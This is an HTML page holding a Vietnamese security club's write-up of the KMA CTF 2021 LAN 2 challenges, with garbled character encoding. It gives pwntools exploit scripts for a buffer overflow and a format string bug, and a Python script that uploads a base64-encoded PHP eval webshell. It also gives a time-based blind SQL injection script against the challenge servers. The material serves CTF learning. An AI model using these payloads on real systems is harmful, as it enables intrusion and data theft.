
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>KMA CTF 2021 LAN 2</title>
    <link rel="stylesheet" href="/asset/css/base.css">
    <link rel="stylesheet" href="/asset/animation/animation.css">
    <link rel="icon" type="image/x-icon" href="/asset/img/club_logo.jpg">
    <link rel="stylesheet" href="/asset/page-css/writeup-page/text.css">
    <link rel="stylesheet" href="/asset/css/writeup-responsive.css">
    <link rel="stylesheet" href="/asset/css/responsive.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.1/css/all.min.css" integrity="sha512-MV7K8+y+gLIBoVD59lQIYicR65iaqukzvf/nwasF0nqhPay5w/9lJmVM2hMDcnK1OnMGCdVK+iQrJ7lzPJQd1w==" crossorigin="anonymous" referrerpolicy="no-referrer" />
</head>
<body>
    <div id="main">
        <div id="header">
            <div class="header-container">
                <a href="/index.html" class="club-img">
                    <img src="/asset/img/club_logo.jpg" alt="">
                </a>
                <i class="fa-solid fa-list"></i>
                <div class="nav-container">
                    <ul>
                        <li><a href="/page/team_members/team_members.html">Members</a></li>
                        <li><a href="/page/about_us/about_us.html">About us</a></li>
                        <li><a href="/page/team_history/team_history.html">History</a></li>
                        <li style="background-color: var(--white);"><a style="color: var(--blue);" href="/page/write_up/write_up.html">Write up</a></li>
                        <li><a href="/page/achievement/achievement.html">Achievement</a></li>
                    </ul>
                </div>
            </div>
        </div>


        <div id="content">
            <div class="title-container">
                <h1 class="main-title">
                    KMA CTF 2021 LAN 2
                </h1>
            </div>
            <div class="content-container">
                <div class="container">
                    <table>
                        <thead>
                        <tr>
                        <th>Challenge type</th>
                        </tr>
                        </thead>
                        <tbody>
                        <tr>
                        <td><a href="#WEB">WEB</a></td>
                        </tr>
                        <tr>
                        <td><a href="#PWNABLE">PWNABLE</a></td>
                        </tr>
                        <tr>
                        <td><a href="#REVERSE">REVERSE</a></td>
                        </tr>
                        <tr>
                        <td><a href="#CRYPTOGRAPHY">CRYPTOGRAPHY</a></td>
                        </tr>
                        <tr>
                        <td><a href="#FORENSIC">FORENSIC</a></td>
                        </tr>
                        </tbody>
                        </table>
                        <h1 id="PWNABLE">PWN üå±</h1>
                        <p>Credit write-up: <a href="https://github.com/n0bit4lsm3">Th√†nh Draw</a></p>
                        <h3>KMA</h3>
                        <p>ƒê·ªëi v·ªõi c√°c b√†i th·ª≠ th√°ch v·ªÅ Pwn, ƒë·∫ßu ti√™n ch√∫ng ta s·∫Ω ki·ªÉm tra c√°c ki·∫øn tr√∫c v√† c∆° ch·∫ø b·∫£o v·ªá c·ªßa n√≥ nh∆∞:</p>
                        <ul>
                        <li>Architecture: Intel x86, Intel x64, ARM, ...</li>
                        <li>
                        <a href="https://ctf101.org/binary-exploitation/relocation-read-only/">RELRO</a>: c∆° ch·∫ø n√†y cho ph√©p m·ªôt s·ªë section ch·ªâ ƒë∆∞·ª£c read (kh√¥ng c√≥ quy·ªÅn write, execute).</li>
                        <li>
                        <a href="https://ctf101.org/binary-exploitation/stack-canaries/">Stack</a>: c∆° ch·∫ø n√†y ki·ªÉm tra xem stack c√≥ b·ªã overwrite kh√¥ng.</li>
                        <li>
                        <a href="https://ctf101.org/binary-exploitation/no-execute/">NX</a>: c∆° ch·∫ø ngƒÉn ch·∫∑n input ho·∫∑c data th·ª±c thi.</li>
                        <li>
                        <a href="https://ir0nstone.gitbook.io/notes/types/stack/pie">PIE</a>: c∆° ch·∫ø gi√∫p file load v√†o c√°c v√πng nh·ªõ kh√°c nhau, l√†m cho ƒë·ªãa ch·ªâ kh√¥ng c·ªë ƒë·ªãnh.</li>
                        </ul>
                        <p>ƒê·ªÉ ki·ªÉm tra, t√¥i s·∫Ω s·ª≠ d·ª•ng <code>checksec</code> tool.</p>
                        <p><a href="https://user-images.githubusercontent.com/38103453/131296774-967822f3-3e4d-4afe-ba34-72bc051116ca.PNG"><img src="https://user-images.githubusercontent.com/38103453/131296774-967822f3-3e4d-4afe-ba34-72bc051116ca.PNG" alt="h1" /></a></p>
                        <p>V√¨ ƒë√¢y l√† m·ªôt challenge ƒë∆°n gi·∫£n, c√°c c∆° ch·∫ø b·∫£o v·ªá ƒë√£ ƒë∆∞·ª£c disable ƒë·ªÉ d·ªÖ d√†ng trong vi·ªác exploit.</p>
                        <p>Load v√†o IDA ƒë·ªÉ ph√¢n t√≠ch.</p>
                        <p><a href="https://user-images.githubusercontent.com/38103453/131296777-4e9bc669-013f-4665-ab7d-b313623327c0.PNG"><img src="https://user-images.githubusercontent.com/38103453/131296777-4e9bc669-013f-4665-ab7d-b313623327c0.PNG" alt="h2" /></a></p>
                        <p>Lu·ªìng ch∆∞∆°ng tr√¨nh:</p>
                        <ul>
                        <li>Kh·ªüi t·∫°o 0x20 bytes tr√™n stack ƒë·ªÉ l∆∞u input.</li>
                        <li>Cho ph√©p ng∆∞·ªùi d√πng nh·∫≠p l√™n ƒë·∫øn 0x100 bytes.</li>
                        <li>Gi·∫£i ph√≥ng 0x20 bytes tr√™n stack v√† l·ªánh <code>pop edx</code> s·∫Ω l·∫•y gi√° tr·ªã ƒë·ªÉ so s√°nh. N·∫øu <code>edx</code> b·∫±ng v·ªõi chu·ªói <code>_KMA</code> th√¨ s·∫Ω ƒë∆∞·ª£c v√†o shell.</li>
                        </ul>
                        <p>T·ª´ ƒë√¢y, t√¥i c√≥ th·ªÉ k·∫øt lu·∫≠n ƒë√¢y l√† Buffer Overflow.</p>
                        <p>ƒê·ªÉ exploit ta ch·ªâ c·∫ßn nh·∫≠p ƒë·ªß 0x20 bytes, theo sau l√† chu·ªói <code>_KMA</code>.</p>
                        <p><a href="https://user-images.githubusercontent.com/38103453/131296781-7cbbde95-97a4-4fda-b28a-615337ffa607.PNG"><img src="https://user-images.githubusercontent.com/38103453/131296781-7cbbde95-97a4-4fda-b28a-615337ffa607.PNG" alt="h3" /></a></p>
                        <h3>Amazingg</h3>
                        <p>Ki·ªÉm tra c√°c c∆° ch·∫ø b·∫£o v·ªá c·ªßa file.</p>
                        <p><a href="https://user-images.githubusercontent.com/38103453/131296782-3bce8f04-2345-4475-a08a-5ca5c28fe6e3.PNG"><img src="https://user-images.githubusercontent.com/38103453/131296782-3bce8f04-2345-4475-a08a-5ca5c28fe6e3.PNG" alt="h4" /></a></p>
                        <p>Ch√∫ √Ω, ta th·∫•y ƒë√¢y l√† m·ªôt file 64 bit. Load file v√†o IDA ƒë·ªÉ ph√¢n t√≠ch.</p>
                        <p><a href="https://user-images.githubusercontent.com/38103453/131296785-e9f56028-5441-42fc-a641-70b57777ac4b.PNG"><img src="https://user-images.githubusercontent.com/38103453/131296785-e9f56028-5441-42fc-a641-70b57777ac4b.PNG" alt="h5" /></a></p>
                        <p>T·∫°i h√†m <code>gets()</code> cho ph√©p nh·∫≠p v·ªõi ƒë·ªô d√†i t√πy √Ω, n√™n t√¥i x√°c ƒë·ªãnh ƒë√¢y l√† Buffer Overflow.</p>
                        <p><a href="https://user-images.githubusercontent.com/38103453/131296786-4f1d229d-1c54-450e-8b56-f022bd93d132.PNG"><img src="https://user-images.githubusercontent.com/38103453/131296786-4f1d229d-1c54-450e-8b56-f022bd93d132.PNG" alt="h6" /></a></p>
                        <p>Nh√¨n v√†o c√°c function c·ªßa ch∆∞∆°ng tr√¨nh, t√¥i th·∫•y th√™m c√°c h√†m <code>Func1()</code>, <code>Func2()</code>, <code>Func3()</code>, <code>Puts_flag()</code>.</p>
                        <p>H√†m <code>Puts_flag()</code> s·∫Ω ki·ªÉm tra c√°c bi·∫øn <code>check1</code>, <code>check2</code>, <code>check3</code> do c√°c h√†m <code>Func1()</code>, <code>Func2()</code>, <code>Func3()</code> g√°n. Do v·∫≠y, ta ph·∫£i l·ª£i d·ª•ng l·ªó h·ªïng Buffer Overflow ƒë·ªÉ th·ª±c thi ƒë∆∞·ª£c t·∫•t c·∫£ c√°c h√†m n√†y m·ªõi c√≥ th·ªÉ l·∫•y ƒë∆∞·ª£c flag.</p>
                        <p>ƒê·ªÉ l√†m ƒë∆∞·ª£c ƒëi·ªÅu n√†y, ta ph·∫£i t√≠nh to√°n offset h·ª£p l√Ω ƒë·ªÉ t·∫°o payload.</p>
                        <ul>
                        <li>ƒê·∫ßu ti√™n, trong h√†m <code>main()</code> c√≥ l·ªánh <code>sub rsp, 10h</code> v√† <code>leave</code> n√™n ta s·∫Ω nh·∫≠p ƒë·ªß 0x10 bytes. (V√¨ sao th√¨ c√°c b·∫°n xem √Ω nghƒ©a c·ªßa l·ªánh leave).</li>
                        <li>Ti·∫øp theo, c√°c h√†m <code>Func1()</code>, <code>Func2()</code>, <code>Func3()</code> ƒë·ªÅu c√≥ l·ªánh <code>cmp [rbp-4], 539h</code>. N√™n ta s·∫Ω nh·∫≠p 4 bytes t√πy √Ω v√† 0x539 ƒë·ªÉ ghi ƒë√® v√†o <code>rbp</code>.</li>
                        <li>Cu·ªëi c√πng, <code>return address</code> t√¥i s·∫Ω nh·∫≠p v√†o c√°c h√†m c·∫ßn th·ª±c thi.</li>
                        </ul>
                        <p>ƒê√¢y l√† script exploit.</p>
                        <pre><code>from pwn import *
                        
                        p = process(&quot;./amazingg&quot;)
                        p.recvuntil(&quot;step....\n&quot;)
                        p.sendline(b&quot;a&quot;*16 + b&quot;a&quot;*4 + p32(1337) + p64(0x4006E6) + p64(0x40070E) + p64(0x400736) + p64(0x40075E))
                        p.interactive()
                        </code></pre>
                        <h3>fs</h3>
                        <p>Ki·ªÉm tra c√°c c∆° ch·∫ø b·∫£o v·ªá c·ªßa file.</p>
                        <p><a href="https://user-images.githubusercontent.com/38103453/131296791-006dadfc-4229-4d35-8932-15005ca7fb33.PNG"><img src="https://user-images.githubusercontent.com/38103453/131296791-006dadfc-4229-4d35-8932-15005ca7fb33.PNG" alt="h7" /></a></p>
                        <p>Challenge n√†y ƒë√£ b·∫≠t c∆° ch·∫ø Stack Canary, n√™n s·∫Ω kh√¥ng c√≥ l·ªó h·ªïng Buffer Overflow n·ªØa.</p>
                        <p>Load file v√†o IDA ƒë·ªÉ ph√¢n t√≠ch.</p>
                        <p><a href="https://user-images.githubusercontent.com/38103453/131296793-83f4495e-f1ac-44b8-93c3-c2b30e850e42.PNG"><img src="https://user-images.githubusercontent.com/38103453/131296793-83f4495e-f1ac-44b8-93c3-c2b30e850e42.PNG" alt="h8" /></a></p>
                        <p>Trong h√†m <code>vuln()</code>, t√¥i th·∫•y c√≥ l·ªánh <code>printf(s);</code> n√™n t√¥i x√°c ƒë·ªãnh ƒë√¢y l√† l·ªï h·ªïng Format String.</p>
                        <p>ƒê·ªÉ khai th√°c l·ªói n√†y, ta ph·∫£i t√¨m ƒë∆∞·ª£c offset, t·ª´ <code>esp</code> ƒë·∫øn v√πng nh·ªõ flag ƒë∆∞·ª£c l∆∞u tr·ªØ ·ªü stack.</p>
                        <p><a href="https://user-images.githubusercontent.com/38103453/131296794-66db61f0-8978-4eb7-bea5-0589cafe24fa.PNG"><img src="https://user-images.githubusercontent.com/38103453/131296794-66db61f0-8978-4eb7-bea5-0589cafe24fa.PNG" alt="h9" /></a></p>
                        <p>B·∫≠t debug, t√¥i t√¨m ƒë∆∞·ª£c offset b·∫Øt ƒë·∫ßu c·ªßa flag s·∫Ω l√† <code>57</code>. ƒê·ªÉ l·∫•y ƒë∆∞·ª£c gi√° tr·ªã t·∫°i offset n√†y, t√¥i d√πng format <code>$p</code>.</p>
                        <p>Vi·∫øt Script khai th√°c.</p>
                        <pre><code>from pwn import *
                        
                        offset = 57
                        flag = &quot;&quot;
                        
                        while True:
                            p = process(&quot;./fs&quot;)
                        
                            p.recvuntil(&quot;\n&quot;)
                        
                            payload = &quot;%&quot; + str(offset) + &quot;$p&quot;
                            p.sendline(payload)
                        
                            recv = p.recvuntil(&quot;\n&quot;).decode(&quot;utf-8&quot;)
                            recv = recv[11:len(recv) - 1]
                            if offset == 57:
                                recv = recv[:len(recv) - 2]
                            flag += bytes.fromhex(recv).decode('utf-8')[::-1]
                            offset += 1
                        
                            print(flag)
                        </code></pre>
                        <hr />
                        <h1 id="WEB">WEB üç¶</h1>
                        <p>Credit write-up: <a href="https://github.com/nhienit2010">nhienit2010</a></p>
                        <h3>ekyc</h3>
                        <p>ƒê·∫ßu ti√™n, ta d√πng <code>git-dumper</code> ƒë·ªÉ k√©o to√†n b·ªô folder <code>.git</code> tr√™n server v·ªÅ v√† l·∫•y source.
                        Source code:</p>
                        <pre><code>&lt;?php
                        ini_set(&quot;display_errors&quot;, 1);
                        // ini_set(&quot;display_startup_errors&quot;, 1);
                        error_reporting(E_ALL);
                        
                        $DB_HOST = '192.168.0.3';
                        $DB_PORT = 27017;
                        $DB_NAME = 'apikey_db';
                        
                        function get_client_ip()
                        {
                          $ipaddress = '';
                          if (isset($_SERVER['HTTP_CLIENT_IP']))
                            $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
                          else if (isset($_SERVER['HTTP_X_FORWARDED_FOR']))
                            $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
                          else if (isset($_SERVER['HTTP_X_FORWARDED']))
                            $ipaddress = $_SERVER['HTTP_X_FORWARDED'];
                          else if (isset($_SERVER['HTTP_FORWARDED_FOR']))
                            $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
                          else if (isset($_SERVER['HTTP_FORWARDED']))
                            $ipaddress = $_SERVER['HTTP_FORWARDED'];
                          else if (isset($_SERVER['REMOTE_ADDR']))
                            $ipaddress = $_SERVER['REMOTE_ADDR'];
                          else
                            $ipaddress = 'UNKNOWN';
                          return $ipaddress;
                        }
                        //check db
                        try {
                          //Connect DB
                          $key = &quot;&quot;;
                          $limit = &quot;&quot;;
                          $current = &quot;&quot;;
                          //Get Key - Value from DB &amp;&amp; Check API-key form request
                          $header = getallheaders();
                          if (isset($header['Api-Key'])) {
                            $query = [[
                              'key' =&gt; 'key',
                              'limit' =&gt; 10,
                              'current' =&gt; 0
                            ]];
                            if ($query) {
                              $key = $query[0]['key'];
                              $limit = $query[0]['limit'];
                              $current = $query[0]['current'];
                              $key_send = $header['Api-Key'];
                              // var_dump($key_send);
                              if ($key_send == $key) {
                                if ($limit &gt;= $current) {
                                  $current++;
                                  $data_log = $_REQUEST;
                                  $data_send = $_POST;
                                  $data_log['IP'] = get_client_ip();
                                  $data_log['requestTime'] = new \DateTime();
                        
                                  try {
                                    //Add to memcached
                                    $memcached = new Memcached();
                                    $memcached-&gt;addServer('127.0.0.1', 11211);
                                    $memcached-&gt;add(&quot;file_base64_AIconnector&quot;, $data_send['base64'], 36000);
                                    //Add to Redis
                                    $redis = new Redis();
                                    $redis-&gt;connect('192.168.16.164', 6798);
                                    $redis-&gt;auth('apikey_cloud');
                                    $redis-&gt;set('key_AIconnector', $key);
                                    $redis-&gt;set('limit_AIconnector', $limit);
                                    $redis-&gt;set('current_AIconnector', $current);
                                  } catch (\Throwable $e) {
                                  }
                        
                                  $base64_string = $_POST[&quot;base64&quot;];
                                  // echo $base64_string;
                                  //Check have extension in base64 string or not
                                  if (strpos($base64_string, ',')) {
                                    // Chia base64 v√† data IMEI
                                    $check_imei = explode(',', $base64_string);
                                    $base64 = $check_imei[1];
                                    $imei = $check_imei[0];
                                    //L·∫•y EMEI
                                    $imei = substr($imei, 5, -7);  // bcd
                                    var_dump($imei);
                                    var_dump($base64);
                                    $extension_file = explode('/', $imei);
                                    //Write to new file
                                    $output_file = __DIR__ . &quot;/upload/img_&quot; . time() . &quot;.&quot; . $extension_file[1];
                                    var_dump($output_file);
                        
                                    $file = fopen($output_file, &quot;wb&quot;);
                                    fwrite($file, base64_decode($base64));
                                    fclose($file);
                                    $finfo = finfo_open(FILEINFO_MIME_TYPE);
                                    $finfo = finfo_file($finfo, $output_file);
                                    $cFile = curl_file_create($output_file, $finfo, basename($output_file));
                        
                                    $data_send_final = array(&quot;image&quot; =&gt; $cFile, &quot;filename&quot; =&gt; $output_file, &quot;mime&quot; =&gt; $finfo, &quot;postname&quot; =&gt; basename($output_file));
                                    //After write log, send data to 3rd party
                                    var_dump($data_send_final);
                                    $curl = curl_init();
                                    $data_string = json_encode($data_send_final);
                                    curl_setopt_array($curl, array(
                                      CURLOPT_URL =&gt; &quot;https://api.fpt.ai/vision/idr/vnm&quot;,
                                      CURLOPT_CUSTOMREQUEST =&gt; &quot;POST&quot;,
                                      CURLOPT_POSTFIELDS =&gt; $data_send_final,
                                      CURLOPT_HTTPHEADER =&gt; array(
                                        &quot;api-key: &quot; . $key
                                      ),
                                      CURLOPT_RETURNTRANSFER =&gt; true,
                                    ));
                                    $response = curl_exec($curl);
                                    $err = curl_error($curl);
                                    curl_close($curl);
                                    if ($err) {
                                      echo &quot;cURL Error #:&quot; . $err;
                                    } else {
                                      header('Content-Type: application/json');
                                      echo $response;
                                    }
                                  } else {
                                    //Write to new file
                                    $output_file = __DIR__ . &quot;/upload/img_&quot; . time() . &quot;.jpg&quot;;
                                    $file = fopen($output_file, &quot;wb&quot;);
                                    fwrite($file, base64_decode($base64_string));
                                    fclose($file);
                        
                                    $finfo = finfo_open(FILEINFO_MIME_TYPE);
                                    $finfo = finfo_file($finfo, $output_file);
                                    $cFile = curl_file_create($output_file, $finfo, basename($output_file));
                        
                                    $data_send_final = array(&quot;image&quot; =&gt; $cFile, &quot;filename&quot; =&gt; $output_file, &quot;mime&quot; =&gt; $finfo, &quot;postname&quot; =&gt; basename($output_file));
                                    //After write log, send data to 3rd party
                                    $curl = curl_init();
                                    $data_string = json_encode($data_send_final);
                        
                                    curl_setopt_array($curl, array(
                                      CURLOPT_URL =&gt; &quot;https://api.fpt.ai/vision/idr/vnm&quot;,
                                      CURLOPT_CUSTOMREQUEST =&gt; &quot;POST&quot;,
                                      CURLOPT_POSTFIELDS =&gt; $data_send_final,
                                      CURLOPT_HTTPHEADER =&gt; array(
                                        &quot;api-key: &quot; . $key
                                      ),
                                      CURLOPT_RETURNTRANSFER =&gt; true,
                                    ));
                                    $response = curl_exec($curl);
                                    $err = curl_error($curl);
                                    curl_close($curl);
                                    if ($err) {
                                      echo &quot;cURL Error #:&quot; . $err;
                                    } else {
                                      header('Content-Type: application/json');
                                      echo $response;
                                    }
                                  }
                                } else {
                                  $return = array(&quot;errorCode&quot; =&gt;  &quot;11&quot;, &quot;errorMessage&quot; =&gt; &quot;Reach Request Limit&quot;, &quot;data&quot; =&gt; $_REQUEST);
                                  header('Content-Type: application/json');
                                  echo json_encode($return);
                                }
                              }
                            } else {
                              $return = array(&quot;errorCode&quot; =&gt;  &quot;1&quot;, &quot;errorMessage&quot; =&gt; &quot;The key isn't correct&quot;, &quot;data&quot; =&gt; $_REQUEST);
                              header('Content-Type: application/json');
                              echo json_encode($return);
                            }
                          } else {
                            $return = array(&quot;errorCode&quot; =&gt;  &quot;403&quot;, &quot;errorMessage&quot; =&gt; &quot;Permission Denied!&quot;);
                            header('Content-Type: application/json');
                            echo json_encode($return);
                          }
                          exit(0);
                        } catch (Exception $ex) {
                          http_response_code(505);
                          die();
                        }
                        </code></pre>
                        <p>Nh√¨n c√≥ v·∫ª kh√° ph·ª©c t·∫°p nh∆∞ng ta ch·ªâ ch√∫ √Ω ƒë·∫øn ƒëo·∫°n n√†y</p>
                        <pre><code>$base64_string = $_POST[&quot;base64&quot;];
                                  // echo $base64_string;
                                  //Check have extension in base64 string or not
                                  if (strpos($base64_string, ',')) {
                                    // Chia base64 v√† data IMEI
                                    $check_imei = explode(',', $base64_string);
                                    $base64 = $check_imei[1];
                                    $imei = $check_imei[0];
                                    //L·∫•y EMEI
                                    $imei = substr($imei, 5, -7);  // bcd
                                    $extension_file = explode('/', $imei);
                                    //Write to new file
                                    $output_file = __DIR__ . &quot;/upload/img_&quot; . time() . &quot;.&quot; . $extension_file[1];
                                    $file = fopen($output_file, &quot;wb&quot;);
                                    fwrite($file, base64_decode($base64));
                                    fclose($file)
                        </code></pre>
                        <p>·ªû ƒë√¢y ta th·∫•y c√≥ th·ªÉ control ƒë∆∞·ª£c extension v√† n·ªôi dung c·ªßa file upload n√™n √Ω t∆∞·ªüng l√† d√πng ch·ª©c nƒÉng n√†y ƒë·ªÉ t·∫°o m·ªôt php webshell. V√† <code>$_POST[&quot;base64&quot;]</code> l√† m·ªôt string ƒë∆∞·ª£c chia l√†m 2 ph·∫ßn t√°ch b·ªüi d·∫•u <code>,</code>, ph·∫ßn b√™n ph·∫£i l√† chu·ªói base64 sau khi decode ra th√¨ s·∫Ω l√† n·ªôi dung c·ªßa file, v√† ph·∫ßn b√™n tr√°i ƒë∆∞·ª£c check ƒë·ªÉ l·∫•y <code>extension</code>.
                        <code>$extension_file</code> s·∫Ω ƒë∆∞·ª£c l·∫•y t·ª´ <code>substr($imei, 5, -7)</code> (v·ªõi <code>$imei</code> ph·∫ßn b√™n tr√°i c·ªßa chu·ªói <code>$_POST[&quot;base64&quot;]</code> t√°ch b·ªüi d·∫•u <code>,</code>), nghƒ©a l√† chu·ªói s·∫Ω ƒë∆∞·ª£c c·∫Øt t·ª´ v·ªã tr√≠ <code>5 k√Ω t·ª± ƒë·∫ßu</code> v√† v·ªã tr√≠ <code>7 k√Ω t·ª± t·ª´ k√Ω t·ª± cu·ªëi c√πng tr·ªü ng∆∞·ª£c v·ªÅ ƒë·∫ßu</code>. V√≠ d·ª•: <code>substr(&quot;ahihi/php1234567&quot;, 5, -7) = /php</code>.
                        Khi th√†nh c√¥ng th√¨ t√™n file s·∫Ω ƒë∆∞·ª£c l∆∞u v√† c√≥ d·∫°ng <code>/upload/img_23132123121.php</code> v·ªõi s·ªë <code>23132123121</code> ƒë∆∞·ª£c h√†m <code>time()</code> t·∫°o ra. V√† s·ªë do h√†m <code>time</code> gen ra ta c√≥ th·ªÉ brute-force ƒë·ªÉ t√¨m ra t√™n file.
                        ƒê·ªÉ l√†m ƒë∆∞·ª£c nh·ªØng ƒëi·ªÅu ƒë√≥, m·ªôt ƒëi·ªÅu ki·ªán quan tr·ªçng n·ªØa l√† ph·∫£i t·ªìn t·∫°i header <code>Api-Key</code> v√† gi√° tr·ªã c·ªßa n√≥ ph·∫£i l√† <code>key</code>, d·ª±a v√†o source code nh∆∞ sau:</p>
                        <pre><code>if ($query) {
                              $key = $query[0]['key'];
                              $limit = $query[0]['limit'];
                              $current = $query[0]['current'];
                              $key_send = $header['Api-Key'];
                              // var_dump($key_send);
                              if ($key_send == $key) {
                        </code></pre>
                        <p>Nh∆∞ng khi th·ª≠ th√¨ fail c√≥ v·∫ª nh∆∞ server ch·∫∑n truy c·∫≠p v√†o c√°c file c√≥ d·∫°ng <code>img_xxxxxxx.php</code> ch·ªâ to√†n tr·ªè v·ªÅ <code>img_.php</code>, v√¨ th·∫ø ta ch·ªâ c·∫ßn th√™m g√¨ ƒë√≥ tr∆∞·ªõc <code>.php</code> l√† ƒë∆∞·ª£c v√≠ d·ª• nh∆∞: <code>img_1233112323.aa.php</code></p>
                        <p>My solution:</p>
                        <pre><code>import requests
                        import time
                        
                        url = 'http://ekyc.ctf.actvn.edu.vn'
                        r = requests.Session()
                        headers = {'Api-Key': 'key', 'X-Forwarded-For':'127.0.0.1'}
                        
                        def exploit():
                            s = int(time.time())
                            resp = r.post(url, headers=headers, data={'base64':'asdas/aa.phpsasdphp,PD9waHAgCmV2YWwoJF9HRVRbJ2NtZCddKTsKPz4='})
                        
                            for i in range(s, s+10):
                                u = url + '/upload/img_' + str(i) + '.aa.php'
                                resp = r.get(u, headers=headers)
                                if resp.status_code != 404:
                                    print(u)
                        
                        if __name__ == &quot;__main__&quot;:
                            exploit()
                        </code></pre>
                        <p>Flag: <code>KMACTF{Ekyc_Ekyc_Everywhere}</code></p>
                        <h3>SQL injection</h3>
                        <p>C√≥ m·ªôt khung search text cho ta nh·∫≠p v√†o m·ªôt th·ª© g√¨ ƒë√≥ v√† sau ƒë√≥ tr·∫£ v·ªÅ d·ªØ li·ªáu t·ª´ database, khi search th√¨ d·ªØ li·ªáu POST l√™n c√≥ d·∫°ng</p>
                        <pre><code>{
                         &quot;s&quot;:&quot;anything&quot;,
                         &quot;f&quot;:[
                             &quot;id&quot;,
                             &quot;text&quot;,
                             &quot;title&quot;, 
                             &quot;description&quot;]
                        }
                        </code></pre>
                        <p>Nh∆∞ng c√≥ v·∫ª tr∆∞·ªùng <code>f</code> kia ch·ª©a <code>column</code> s·∫Ω ƒë∆∞·ª£c ƒë∆∞a v√†o c√¢u query, nghƒ©a l√† ta c√≥ th·ªÉ control ƒë∆∞·ª£c t√™n c·ªôt. M√¨nh ƒë√£ th·ª≠ thay <code>description</code> th√†nh <code>sleep(3)</code> th√¨ response tr·∫£ v·ªÅ sau 3s, n√™n ƒë√¢y l√† ch·ªï m√† ta c√≥ th·ªÉ inject.
                        Query ƒë·ªÉ l·∫•y t√™n b·∫£ng:</p>
                        <pre><code>{
                         &quot;s&quot;:&quot;anything&quot;,
                         &quot;f&quot;:[
                             &quot;id&quot;,
                             &quot;text&quot;,
                             &quot;title&quot;, 
                             &quot;(select case when (select table_name from information_schema.tables limit 1 offset 1) like '_fl%' then sleep(1) else 1 end)-- -&quot;]
                        }  
                        </code></pre>
                        <p>Sau m·ªôt l√∫c ta nh·∫≠n c√≥ ƒë∆∞·ª£c b·∫£ng <code>_flag_</code> v√† c√≥ m·ªôt column l√† <code>flag</code>, nh∆∞ng d·ª±a v√†o hint t·ª´ author l√† flag c√≥ ch·ª©a k√Ω t·ª± <code>utf8mb4</code>, nghƒ©a l√† flag kh√¥ng ch·ª©a c√°c k√Ω t·ª± <code>alphabet</code> nh∆∞ b√¨nh th∆∞·ªùng, √Ω t∆∞·ªüng l√† encode n√≥ sang hex v√† d√πng regex ƒë·ªÉ l·∫•y c√°c k√Ω t·ª± hex ƒë√≥ ra v√¨ hex ch·ªâ ch·ª©a c√°c k√Ω t·ª± t·ª´ [0-&gt;f]</p>
                        <p>My solution:</p>
                        <pre><code>import requests
                        from string import printable
                        import time
                        
                        url = 'http://bif.ctf.actvn.edu.vn'
                        r = requests.Session()
                        flag = ''
                        while True:
                            for c in printable.replace('%','').replace('*',''):
                                payload = f&quot;(select case when (select hex(flag) from _flag_ limit 1 offset 0) RLIKE \&quot;^{flag + c}.*\&quot; then sleep(1) else 1 end)-- -&quot;
                                data = {&quot;s&quot;:&quot;anything&quot;,&quot;f&quot;:[&quot;1&quot;,&quot;2&quot;,&quot;3&quot;, payload]}
                                s = time.time()
                                resp = r.post(url, json=data, headers={'Content-type': 'application/json'})
                                e = time.time()
                        
                                if (e - s &gt;= 2):
                                    flag += c
                                    print(flag)
                                    break
                        </code></pre>
                        <p>Flag: <code>KMACTF{üê±üêàüêà‚Äç‚¨õüêàüêàüêàüê±}</code></p>
                        <hr />
                        <h1 id="FORENSIC">FORENSIC üåè</h1>
                        <h3>Talk-72</h3>
                        <p>Credit write-up: DangKhai</p>
                        <p>Challenge link: <a href="https://drive.google.com/file/d/1S4s4Z4Kii9CrRaJ8WLXXEMKjOd-qMLYY/view?usp=sharing">link</a></p>
                        <pre><code>Description: I hear them whispering something!
                        </code></pre>
                        <p>G·ª£i √Ω:</p>
                        <p>S·ª≠ d·ª•ng c√¥ng c·ª• <a href="https://www.qsl.net/on6mu/rxsstv.htm">SSTV Decoder</a> v·ªõi ch·ª©c nƒÉng <code>robot 72</code> th·ª±c hi·ªán gi·∫£i m√£ ƒëo·∫°n wav.</p>
                        <blockquote>
                        <p>Flag: KMA{4r3a_51_closer_UFO}</p>
                        </blockquote>
                        <h3>Old trick ;)</h3>
                        <p>Credit write-up: DangKhai</p>
                        <p>Challenge link: <a href="https://drive.google.com/file/d/113PYny-dTnHWOfObzwxh7MxLPU-AjEVy/view?usp=sharing">link</a></p>
                        <pre><code>Description: Not image.
                        </code></pre>
                        <p>G·ª£i √Ω:</p>
                        <ol>
                        <li>Tr√≠ch xu·∫•t m√£ m√†u rgb c·ªßa ·∫£nh ƒë∆∞·ª£c cho. V√≠ d·ª• ·ªü pixel th·ª© nh·∫•t t·ª©c <code>x,y(0,0)</code> tr√≠ch xu·∫•t ƒë∆∞·ª£c gi√° tr·ªã <code>RGB(33, 193, 180)</code>, sau ƒë√≥ chuy·ªÉn ƒë·ªïi gi√° tr·ªã RGB n√†y th√†nh m√£ hex t∆∞∆°ng ·ª©ng v√≠ d·ª• <strong>21C1B4</strong> . L√†m t∆∞∆°ng t·ª± v·ªõi t·∫•t c·∫£ pixel c·ªßa ·∫£nh.</li>
                        <li>Sau khi chuy·ªÉn ƒë·ªïi th√†nh m√£ hex, x√°c ƒë·ªãnh <strong>signature</strong> c·ªßa t·ªáp ch·ª©a c·ªù.</li>
                        <li>Th·ª±c hi√™n Re-Compress l·∫°i th√†nh t·ªáp v√† nh·∫≠n c·ªù ch·ª©a b√™n trong.</li>
                        </ol>
                        <blockquote>
                        <p>Flag: KMA{0ld_tr!ck_but_y0u_c4n_us3_!t}</p>
                        </blockquote>
                        <h3>Misc - KCSC - HPPD</h3>
                        <p>Credit write-up: DangKhai</p>
                        <p>G·ª£i √Ω:</p>
                        <h4>·∫¢i 1:</h4>
                        <pre><code>                     ------------oOo------------
                        G·ª≠i  c√°c  anh  ch·ªã  c·ª±u  th√†nh  vi√™n,  c√°c  b·∫°n  trong  CLB,  c√°c  nh·∫´n  gi·∫£.
